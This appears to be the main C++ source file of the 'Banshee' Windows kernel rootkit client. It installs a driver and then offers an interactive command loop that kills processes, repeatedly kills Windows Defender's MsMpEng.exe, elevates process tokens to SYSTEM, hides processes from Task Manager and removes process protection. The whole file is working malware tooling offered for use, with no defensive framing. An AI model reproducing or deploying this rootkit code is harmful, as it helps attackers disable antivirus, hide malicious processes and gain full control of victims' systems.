﻿// Banshee.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Banshee.hpp"
#include "Logger.hpp"
#include <iostream>
#include <string.h>

INT 
main(INT argc, CHAR *argv[])
{
    std::cout << " ▄▀▀█▄▄  ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄ " << std::endl;
    std::cout << "▐ ▄▀  █ ▐ ▄▀ ▀▄ █  █ █ █ █ █   ▐ █  █   ▄▀ ▐  ▄▀   ▐ ▐  ▄▀   ▐ " << std::endl;
    std::cout << " █▄▄▄▀    █▄▄▄█ ▐  █  ▀█    ▀▄   ▐  █▄▄▄█    █▄▄▄▄▄    █▄▄▄▄▄  " << std::endl;
    std::cout << " █   █   ▄▀   █   █   █  ▀▄   █     █   █    █    ▌    █    ▌  " << std::endl;
    std::cout << "▄▀▄▄▄▀  █   ▄▀  ▄▀   █    █▀▀▀     ▄▀  ▄▀   ▄▀▄▄▄▄    ▄▀▄▄▄▄   " << std::endl;
    std::cout << "█    ▐   ▐   ▐   █    ▐    ▐       █   █     █    ▐    █    ▐  " << std::endl;
    std::cout << "▐                ▐                 ▐   ▐     ▐         ▐       " << std::endl;
    std::cout << "\n";
    std::cout << "Banshee Rootkit v0.0.1\n                                       " << std::endl;

    if (argc < 2)
    {
        LogError("Please specify the driver location");
        return 1;
    }
    Banshee banshee = Banshee();

    std::string driverPath = argv[1];
    BANSHEE_STATUS BeStatus = banshee.Install(driverPath);

    LogInfo("Installing driver if not already installed...");
    if (BeStatus != BE_SUCCESS)
    {
        if (BeStatus == BE_ERR_DRIVER_NOT_EXISTS)
        {
            LogError("Driver does not exist at path " + driverPath + " ");
        }
        else
        {
            LogError("Error during install");
        }
        return 1;
    }

    LogInfo("Loading driver...");
    if (banshee.Initialize() != BE_SUCCESS)
    {
        LogError("Error during initialization");
        return 2;
    }

    // Main Loop

    bool shouldExit = false;
    while (!shouldExit)
    {
        BANSHEE_STATUS status = BE_ERR_GENERIC;

        std::string choice = AskInput("");
        std::string::iterator end_pos = std::remove(choice.begin(), choice.end(), ' '); // strip spaces from commands
        choice.erase(end_pos, choice.end());

        if (choice == "help")
        {
            printf("\nAvailable commands:\n");
            printf("    kill      - kill process by PID\n");
            printf("    bury      - Create callback to kill process when it comes back up. Defaults to MsMpEng.exe\n");
            printf("    elevate   - Change a process access token to SYSTEM by PID\n");
            printf("    hide      - Hide a process from task manager etc. by PID\n");
            printf("    unprotect - remove protection from process by PID\n");
            printf("    protect   - apply PS_PROTECTED_SYSTEM protection to process by PID\n");
            printf("    test      - test driver\n");
            printf("    load      - load driver from path\n");
            printf("    unload    - unload driver\n");
            printf("    exit      - exit banshee\n");
            continue;
        }
        else if (choice == "exit")
        {
            shouldExit = true;
            continue;
        }
        else if (choice == "test")
        {
            status = banshee.IoCtlTestDriver();
        }
        else if (choice == "load")
        {
            std::string pathToDriver = AskInputNoPrompt("Path to driver: ");
            status = banshee.Install(pathToDriver);
        }
        else if (choice == "unload")
        {
            status = banshee.Unload();
        }
        else if (choice == "load")
        {
            status = banshee.IoCtlTestDriver();
        }
        else if (choice == "kill")
        {
            int targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlKillProcess(targetPid);
        }
        else if (choice == "bury")
        {
            std::string processToBury = AskInputNoPrompt("Target process (substring to match image path, spaces will be stripped): ");

            // strip spaces
            std::string::iterator end_pos = std::remove(processToBury.begin(), processToBury.end(), ' '); 
            processToBury.erase(end_pos, processToBury.end());

            LogInfo("Attempting to bury " + processToBury);
            status = banshee.IoCtlBuryProcess(processToBury);
        }
        else if (choice == "elevate")
        {
            int targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlElevateProcessAccessToken(targetPid);
        }
        else if (choice == "hide")
        {
            int targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlHideProcess(targetPid);
        }
        else if (choice == "unprotect")
        {
            int targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlProtectProcess(targetPid, PS_PROTECTED_NONE);
        }
        else if (choice == "protect")
        {
            int targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlProtectProcess(targetPid, PS_PROTECTED_SYSTEM);
        }
        else
        {
            LogError("Invalid choice: " + choice);
            continue;
        }

        if (status != BE_SUCCESS)
        {
            LogError("Banshee Error: " + std::to_string((int)status));
        }
        else
        {
            LogInfo("BE_SUCCESS");
        }
    }

    return 0;
}


